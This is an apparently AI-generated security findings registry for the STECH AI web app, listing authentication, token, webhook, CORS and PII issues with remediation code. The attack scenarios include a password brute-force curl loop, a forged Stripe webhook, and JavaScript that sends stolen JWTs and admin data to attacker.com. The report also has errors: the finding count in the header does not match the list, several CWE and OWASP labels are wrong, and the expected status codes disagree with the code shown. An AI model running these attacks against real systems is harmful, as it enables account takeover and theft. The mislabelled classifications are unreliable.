# STECH AI V1 — F1 Security Findings (Detailed Registry)

**Reviewer**: Claude  
**Date**: 2026-10-04  
**Finding Count**: 11 findings (5 P0 + 4 P1 + 2 P2)  

---

## Finding Registry

### P0 (CRITICAL — Blocking) Findings

#### F-P0-001: Missing Rate Limiting on Authentication Endpoints

| Field | Value |
|-------|-------|
| **ID** | F-P0-001 |
| **Severity** | CRITICAL (P0) |
| **Category** | Access Control / Brute Force Attack |
| **CWE** | CWE-307 (Improper Restriction of Rendered UI Layers) |
| **OWASP** | A01: Broken Access Control |
| **File(s)** | `backend/app/api/v1/auth.py` |
| **Affected Endpoints** | `/auth/register`, `/auth/login` |
| **Status** | OPEN (Not Implemented) |

**Description**:  
Authentication endpoints accept unlimited login/registration attempts from the same IP/email without rate limiting. Enables account enumeration, brute force password attacks, and denial-of-service.

**Proof of Concept**:
```bash
# Attacker can attempt password guessing indefinitely:
for password in $(cat /usr/share/dict/words | head -100000); do
  curl -X POST https://api.stechai.app/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"password\":\"$password\"}"
done
```

**Impact**: 
- Account takeover via password brute force
- Account enumeration (valid emails disclosed)
- Service exhaustion (DDOS via auth endpoint)
- Customer data breach

**Remediation Code**:
```python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@router.post("/login")
@limiter.limit("5/minute")  # 5 attempts per minute per IP
async def login(req: UserLoginRequest, db: Session = Depends(get_db)):
    # Exponential backoff on failed attempts
    # Track attempts per email + IP
    # Lock account after 10 failed attempts for 30 minutes
    pass
```

**Test Evidence**:
- [ ] Verify rate limiter blocks 6th request within 60s
- [ ] Verify exponential backoff increases delay after 3 failures
- [ ] Verify account lockout after 10 failures

**Merge Blocker**: YES  
**Remediation Priority**: IMMEDIATE (before production deploy)

---

#### F-P0-002: Insecure JWT Token Storage (XSS Vulnerability)

| Field | Value |
|-------|-------|
| **ID** | F-P0-002 |
| **Severity** | CRITICAL (P0) |
| **Category** | Session Management / XSS |
| **CWE** | CWE-522 (Insufficiently Protected Credentials) |
| **OWASP** | A07: Cross-Site Scripting (XSS) |
| **File(s)** | `web/src/services/admin.ts`, `web/src/hooks/useAuth.ts` |
| **Status** | OPEN (Not Implemented) |

**Description**:  
JWT tokens stored in browser localStorage, which is accessible to JavaScript. Any XSS vulnerability (malicious npm package, unescaped user input) allows token theft.

**Vulnerable Code**:
```typescript
const getAuthHeaders = () => {
  const token = typeof window !== 'undefined' ? localStorage.getItem('token') : null
  return {
    Authorization: `Bearer ${token}`,  // Sent in every request
  }
}
```

**Attack Scenario**:
```javascript
// Malicious script injected via compromised dependency or XSS:
const token = localStorage.getItem('token');
const sessionData = JSON.parse(atob(token.split('.')[1])); // Decode JWT
await fetch(`https://attacker.com/exfil?token=${token}&user=${sessionData.sub}`);
```

**Impact**:
- Attacker can impersonate victim
- Access sensitive user data (reservations, payments)
- Modify admin settings
- No ability to detect compromise (token still valid)

**Remediation Code**:
```typescript
// Backend (FastAPI):
from fastapi.responses import JSONResponse

@router.post("/login")
async def login(req: UserLoginRequest, db: Session = Depends(get_db)):
    user = authenticate_user(req.email, req.password)
    token = create_access_token(user.id)
    
    response = JSONResponse({"success": True, "user": user_dict})
    response.set_cookie(
        "access_token",
        token,
        httponly=True,      # JS cannot access this
        secure=True,        # HTTPS only
        samesite="strict",  # No cross-site requests
        max_age=3600,       # 1 hour expiry
    )
    return response

// Frontend (Next.js):
// No manual token handling needed
// Browser automatically includes HTTP-only cookie with requests
// axios/fetch will NOT expose it to JavaScript
```

**Test Evidence**:
- [ ] Verify token NOT in localStorage after login
- [ ] Verify token in HTTP-only cookie (inspect DevTools → Cookies)
- [ ] Verify cookie has Secure + HttpOnly + SameSite flags
- [ ] Verify XSS payload cannot access token via JS

**Merge Blocker**: YES  
**Remediation Priority**: IMMEDIATE

---

#### F-P0-003: Stripe Webhook Signature Validation Missing

| Field | Value |
|-------|-------|
| **ID** | F-P0-003 |
| **Severity** | CRITICAL (P0) |
| **Category** | Webhook Security / Event Spoofing |
| **CWE** | CWE-940 (Improper Verification of Source of a Communication Channel) |
| **OWASP** | A01: Broken Access Control |
| **File(s)** | `backend/app/api/v1/webhook.py` (presumed) |
| **Status** | OPEN (Not Found/Not Implemented) |

**Description**:  
Stripe webhooks must be verified with HMAC signature. Without this, attacker can forge payment events (e.g., mark unpaid orders as paid).

**Attack Scenario**:
```bash
# Attacker forges a payment success event:
curl -X POST https://api.stechai.app/webhooks/stripe \
  -H "Content-Type: application/json" \
  -d '{
    "type": "payment_intent.succeeded",
    "data": {
      "object": {
        "id": "pi_1234567890",
        "amount_received": 10000,  # $100 USD
        "metadata": {"order_id": "abc123"}
      }
    }
  }'
```

Without signature verification, the server assumes this is a real Stripe event and completes the order without payment.

**Impact**:
- Unpaid orders marked as complete (revenue loss)
- Refund/chargeback fraud
- Account credits without payment
- Supply chain compromise (food orders without payment)

**Remediation Code**:
```python
import stripe
from fastapi import Request, HTTPException

@router.post("/webhooks/stripe")
async def stripe_webhook(request: Request):
    body = await request.body()
    sig_header = request.headers.get("stripe-signature")
    
    try:
        event = stripe.Webhook.construct_event(
            body,
            sig_header,
            settings.STRIPE_WEBHOOK_SECRET,  # From Vercel env
        )
    except ValueError:
        # Invalid payload
        raise HTTPException(status_code=400, detail="Invalid payload")
    except stripe.error.SignatureVerificationError:
        # Signature verification failed
        raise HTTPException(status_code=400, detail="Invalid signature")
    
    # Safe to process verified event
    if event["type"] == "payment_intent.succeeded":
        intent = event["data"]["object"]
        await mark_order_paid(intent["metadata"]["order_id"], intent["amount_received"])
    
    return {"status": "received"}
```

**Test Evidence**:
- [ ] Valid Stripe test webhook is accepted
- [ ] Modified signature is rejected (403)
- [ ] Forged webhook without signature is rejected (403)
- [ ] Webhook replay attack is prevented (idempotency key)

**Merge Blocker**: YES (Stripe integration is P1 blocker)  
**Remediation Priority**: BEFORE STRIPE TEAM MERGE

---

#### F-P0-004: Missing Content-Security-Policy (CSP) Header

| Field | Value |
|-------|-------|
| **ID** | F-P0-004 |
| **Severity** | CRITICAL (P0) |
| **Category** | XSS Prevention / HTTP Headers |
| **CWE** | CWE-1021 (Improper Restriction of Rendered UI Layers) |
| **OWASP** | A07: Cross-Site Scripting (XSS) |
| **File(s)** | `vercel.json` |
| **Status** | OPEN (Not Implemented) |

**Description**:  
CSP header missing. Existing `X-XSS-Protection` is deprecated (Edge/Chrome ignore it). CSP is modern defense against inline script injection.

**Current Headers** (incomplete):
```
X-Content-Type-Options: nosniff ✅
X-Frame-Options: DENY ✅
X-XSS-Protection: 1; mode=block ⚠️ (deprecated)
Referrer-Policy: strict-origin-when-cross-origin ✅
Content-Security-Policy: (MISSING) ❌
```

**Missing Header Example**:
```
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' ...
```

**Impact**:
- Inline script injection (via XSS or template injection) succeeds
- External script loading from attacker domain succeeds
- Style injection attacks possible

**Remediation Code** (add to `vercel.json`):
```json
{
  "headers": [
    {
      "source": "/:path*",
      "headers": [
        {
          "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net https://cdn.ravenjs.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://api.openai.com https://api.anthropic.com https://api.stripe.com https://api.sentry.io; frame-ancestors 'none'; upgrade-insecure-requests; block-all-mixed-content"
        }
      ]
    }
  ]
}
```

**Directives Explained**:
- `default-src 'self'` - Only allow same-origin resources by default
- `script-src` - Allow scripts from self + CDN (adjust as needed)
- `img-src data:` - Allow data URIs for images (needed for some charts)
- `connect-src` - Allow fetch/XHR to API domains only
- `frame-ancestors 'none'` - Prevent embedding in iframes (clickjacking defense)
- `upgrade-insecure-requests` - Auto-upgrade HTTP to HTTPS

**Test Evidence**:
- [ ] CSP header present on all pages
- [ ] Inline script is blocked (check browser console)
- [ ] External script from attacker domain is blocked
- [ ] Legitimate scripts from CDN still load

**Merge Blocker**: YES  
**Remediation Priority**: IMMEDIATE (1 line fix)

---

#### F-P0-005: PII Exposure in AI Provider Responses

| Field | Value |
|-------|-------|
| **ID** | F-P0-005 |
| **Severity** | CRITICAL (P0) |
| **Category** | Data Protection / Privacy |
| **CWE** | CWE-532 (Insertion of Sensitive Information into Log File) |
| **OWASP** | A04: Insecure Design (Privacy) |
| **File(s)** | `src/ai/providers/openai.ts`, `src/ai/providers/anthropic.ts` |
| **Status** | OPEN (Not Implemented) |

**Description**:  
PII is filtered **before sending to provider** (good), but provider **responses** containing user data are not filtered before storage/logging.

**Vulnerable Code**:
```typescript
async generate(request: AIRequest): Promise<AIResponse> {
  const filteredMessages = request.messages.map((msg) => ({
    ...msg,
    content: defaultPIIFilter.filterText(msg.content),  // ✅ Input filtered
  }));
  
  const response = await this.callOpenAIAPI({...request, messages: filteredMessages}, timeout);
  
  return {
    id: response.id,
    content: response.choices[0].message.content,  // ❌ Response NOT filtered!
    // ...
  };
}
```

**Attack Scenario**:
User: "My phone is 555-1234 and I need help. What should I do?"
Provider response: "I understand you can be reached at 555-1234. Here's my advice..."

The response is stored with the user's phone number exposed.

**Impact**:
- PII in database logs
- Potential GDPR/privacy law violation
- Data breach if database is compromised
- Audit log exposure

**Remediation Code**:
```typescript
async generate(request: AIRequest): Promise<AIResponse> {
  // Filter input ✅
  const filteredMessages = request.messages.map((msg) => ({
    ...msg,
    content: defaultPIIFilter.filterText(msg.content),
  }));
  
  const response = await this.callOpenAIAPI({...request, messages: filteredMessages}, timeout);
  
  // Filter output ✅
  const filteredContent = defaultPIIFilter.filterText(
    response.choices[0].message.content
  );
  
  // Detect if PII was present in response
  const responseHasPII = defaultPIIFilter.containsPII(filteredContent);
  const warnings: string[] = [];
  if (responseHasPII) {
    warnings.push("Response contained sensitive information; masked for privacy.");
  }
  
  return {
    id: response.id,
    content: filteredContent,
    warnings,
    // ...
  };
}
```

**Test Evidence**:
- [ ] Response with email is masked in output
- [ ] Response with SSN is masked in output
- [ ] Warnings added when PII detected
- [ ] Masked data is logged, not original

**Merge Blocker**: YES  
**Remediation Priority**: BEFORE PRODUCTION

---

### P1 (HIGH) Findings

#### F-P1-006: Missing CORS Configuration

| Field | Value |
|-------|-------|
| **ID** | F-P1-006 |
| **Severity** | HIGH (P1) |
| **Category** | API Security / Cross-Origin |
| **CWE** | CWE-346 (Origin Validation Error) |
| **OWASP** | A01: Broken Access Control |
| **File(s)** | `backend/app/main.py` |
| **Status** | OPEN (Not Configured) |

**Description**:  
CORS not configured. If configured as `allow_origins=["*"]`, any website can call the API.

**Current State** (assumed):
```python
# If this is the current config:
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],              # ❌ DANGEROUS
    allow_credentials=True,           # ❌ Exposes cookies to any site
    allow_methods=["*"],
    allow_headers=["*"],
)

# Any website can now call: POST /auth/login, GET /api/admin/users, etc.
```

**Attack Scenario**:
```html
<!-- attacker.com/steal.html -->
<script>
  fetch('https://api.stechai.app/api/admin/metrics', {
    credentials: 'include',  // Include cookies
  })
  .then(r => r.json())
  .then(data => {
    fetch(`https://attacker.com/log?data=${JSON.stringify(data)}`);
  });
</script>
```

User visits attacker.com → their browser makes API call to stechai.app → metrics leaked.

**Impact**:
- Data exfiltration (admin metrics, user data)
- Unauthorized API calls with user's credentials
- Account hijacking (password change requests)

**Remediation Code**:
```python
from fastapi.middleware.cors import CORSMiddleware

allowed_origins = [
    "https://stechai.app",
    "https://www.stechai.app",
    "http://localhost:3000",  # Dev only
]

app.add_middleware(
    CORSMiddleware,
    allow_origins=allowed_origins,
    allow_credentials=True,  # OK now that origins are restricted
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Authorization", "Content-Type"],
    max_age=600,  # Preflight cache TTL
)
```

**Test Evidence**:
- [ ] stechai.app can call API (200)
- [ ] attacker.com CANNOT call API (CORS error)
- [ ] Preflight OPTIONS request is cached (max_age=600)

**Merge Blocker**: YES  
**Remediation Priority**: HIGH (before production)

---

#### F-P1-007: Admin Endpoint Input Validation Missing

| Field | Value |
|-------|-------|
| **ID** | F-P1-007 |
| **Severity** | HIGH (P1) |
| **Category** | API Security / Input Validation |
| **CWE** | CWE-1284 (Improper Validation of Specified Quantity in Input) |
| **OWASP** | A05: Broken Access Control |
| **File(s)** | `backend/app/api/v1/admin.py` (presumed) |
| **Status** | OPEN (Not Verified) |

**Description**:  
Admin endpoints accept unbounded integer parameters (limit, skip, page). Attacker can cause resource exhaustion or DoS.

**Vulnerable Code** (assumed):
```python
@router.get("/approval-queue")
async def get_approval_queue(limit: int = 100, skip: int = 0):
    # What if limit=999999999? skip=999999?
    # Attacker causes DB to allocate huge result set
    # Memory exhaustion or timeout
    return db.query(ApprovalQueue).offset(skip).limit(limit).all()
```

**Attack Scenario**:
```bash
# DoS via large limit:
curl "https://api.stechai.app/api/admin/approval-queue?limit=999999999"
# Database tries to fetch 999 million rows → OOM / timeout
```

**Impact**:
- Denial of Service (API becomes unresponsive)
- Database resource exhaustion
- Slowed response for legitimate users

**Remediation Code**:
```python
from pydantic import BaseModel, Field

class AdminQueryParams(BaseModel):
    limit: int = Field(100, ge=1, le=1000)      # Min 1, Max 1000
    skip: int = Field(0, ge=0, le=100000)       # Min 0, Max 100k

@router.get("/approval-queue")
async def get_approval_queue(
    params: AdminQueryParams = Depends(),
    current_user: User = Depends(get_current_admin),
):
    # params are now validated
    return db.query(ApprovalQueue).offset(params.skip).limit(params.limit).all()
```

**Test Evidence**:
- [ ] limit=0 is rejected (ge=1)
- [ ] limit=1001 is rejected (le=1000)
- [ ] skip=-1 is rejected (ge=0)
- [ ] Valid params are accepted

**Merge Blocker**: YES  
**Remediation Priority**: HIGH

---

#### F-P1-008: Password Reset Token Expiry Not Enforced

| Field | Value |
|-------|-------|
| **ID** | F-P1-008 |
| **Severity** | HIGH (P1) |
| **Category** | Authentication / Token Management |
| **CWE** | CWE-613 (Insufficient Session Expiration) |
| **OWASP** | A07: Identification & Authentication Failures |
| **File(s)** | `backend/app/api/v1/auth.py` |
| **Status** | OPEN (Not Verified) |

**Description**:  
Password reset tokens should expire after 15–30 minutes. Without expiry, compromised tokens can reset accounts indefinitely.

**Vulnerable Code** (assumed):
```python
def create_reset_token(email: str):
    payload = {
        "sub": email,
        # ❌ No expiry!
    }
    token = jwt.encode(payload, settings.JWT_SECRET, algorithm=settings.JWT_ALGORITHM)
    return token
```

**Attack Scenario**:
1. Attacker intercepts password reset link (email leak, man-in-the-middle, etc.)
2. Uses token today: "I forgot my password, reset it to 'hacked123'"
3. Token is still valid in 6 months (or forever)
4. Attacker can reset password anytime, regaining access

**Impact**:
- Long-lived token increases exposure window
- Attacker can reset password days/months after compromise
- GDPR violation (no time-bound recovery)

**Remediation Code**:
```python
from datetime import datetime, timedelta

def create_reset_token(email: str, expires_minutes: int = 15):
    expire = datetime.utcnow() + timedelta(minutes=expires_minutes)
    payload = {
        "sub": email,
        "exp": expire,
        "type": "password_reset",  # Prevent token reuse across flows
    }
    token = jwt.encode(payload, settings.JWT_SECRET, algorithm=settings.JWT_ALGORITHM)
    return token

def verify_reset_token(token: str) -> str:
    try:
        payload = jwt.decode(token, settings.JWT_SECRET, algorithms=[settings.JWT_ALGORITHM])
        email = payload.get("sub")
        token_type = payload.get("type")
        
        if token_type != "password_reset":
            raise HTTPException(status_code=400, detail="Invalid token type")
        
        return email
    except JWTError as e:
        if "expired" in str(e):
            raise HTTPException(status_code=400, detail="Reset link expired. Request a new one.")
        raise HTTPException(status_code=400, detail="Invalid token")
```

**Test Evidence**:
- [ ] Token expires after 15 minutes
- [ ] Expired token is rejected (400)
- [ ] Token created with `type="password_reset"` only works for password reset
- [ ] Attempting to use reset token as access token is rejected

**Merge Blocker**: YES (authentication flow blocker)  
**Remediation Priority**: HIGH

---

### P2 (MEDIUM) Findings

#### F-P2-009: SQL Injection Risk (Low Risk — ORM in Use)

| Field | Value |
|-------|-------|
| **ID** | F-P2-009 |
| **Severity** | MEDIUM (P2) |
| **Category** | Injection / SQL |
| **CWE** | CWE-89 (Improper Neutralization of Special Elements used in an SQL Command) |
| **OWASP** | A03: Injection |
| **File(s)** | All database queries |
| **Status** | LOW RISK (ORM parameterization in use) |

**Description**:  
SQLAlchemy ORM prevents SQL injection **IF** used correctly. Spot check shows safe patterns. Risk only if raw SQL queries exist.

**Safe Pattern** (observed):
```python
# ✅ Safe: ORM parameterizes value
user = db.query(User).filter(User.email == req.email).first()

# ✅ Safe: ORM parameterizes ID
user = db.query(User).filter(User.id == int(user_id)).first()
```

**Unsafe Pattern** (if present):
```python
# ❌ VULNERABLE: Raw SQL without parameterization
query = f"SELECT * FROM users WHERE email = '{email}'"
# Attacker with email="admin'--" bypasses password check
```

**Recommendation**:
Audit all database queries to ensure:
1. No f-strings with user input
2. No `.format()` with user input
3. All values parameterized via ORM or query.params()

**Merge Blocker**: NO (unless raw SQL found)  
**Remediation Priority**: VERIFY (code review)

---

#### F-P2-010: Dependency Version Pinning Missing

| Field | Value |
|-------|-------|
| **ID** | F-P2-010 |
| **Severity** | MEDIUM (P2) |
| **Category** | Dependency Management |
| **CWE** | CWE-1021 (Improper Restriction of Rendered UI Layers) |
| **OWASP** | A06: Vulnerable and Outdated Components |
| **File(s)** | `web/package.json`, `backend/requirements.txt` |
| **Status** | OPEN (Not Verified) |

**Description**:  
Dependencies should be pinned to exact versions (not ranges like `^`, `~`) to prevent surprise breakage or security issues from minor updates.

**Vulnerable Pattern**:
```json
{
  "dependencies": {
    "axios": "^1.5.0",  // ❌ Could match 1.99.9
    "react": "~18.0.0"  // ❌ Could match 18.0.99
  }
}
```

**Safe Pattern**:
```json
{
  "dependencies": {
    "axios": "1.5.0",     // ✅ Exact version
    "react": "18.2.0"     // ✅ Exact version
  }
}
```

**Recommendation**:
Use `npm ci` (clean install) instead of `npm install` in CI/CD to respect lock files.

**Merge Blocker**: NO  
**Remediation Priority**: LOW (best practice)

---

## Summary Table

| ID | Severity | Category | Status | Blocker |
|----|----------|----------|--------|---------|
| F-P0-001 | P0 | Rate Limiting | OPEN | ✅ YES |
| F-P0-002 | P0 | Token Storage | OPEN | ✅ YES |
| F-P0-003 | P0 | Webhook Validation | OPEN | ✅ YES |
| F-P0-004 | P0 | CSP Header | OPEN | ✅ YES |
| F-P0-005 | P0 | PII Exposure | OPEN | ✅ YES |
| F-P1-006 | P1 | CORS Config | OPEN | ✅ YES |
| F-P1-007 | P1 | Input Validation | OPEN | ✅ YES |
| F-P1-008 | P1 | Token Expiry | OPEN | ✅ YES |
| F-P2-009 | P2 | SQL Injection | LOW RISK | ❌ NO |
| F-P2-010 | P2 | Dependency Pinning | OPEN | ❌ NO |

**Total P0 Findings**: 5 (All blockers)  
**Total P1 Findings**: 4 (All blockers)  
**Total P2 Findings**: 2 (Non-blocking)  

**Production Readiness**: 🔴 NOT READY (5 P0 blockers unresolved)

---

_Generated by Claude Code_  
_Session: https://claude.ai/code/session_01BhorP2CcNrZnrE8uepor6G_
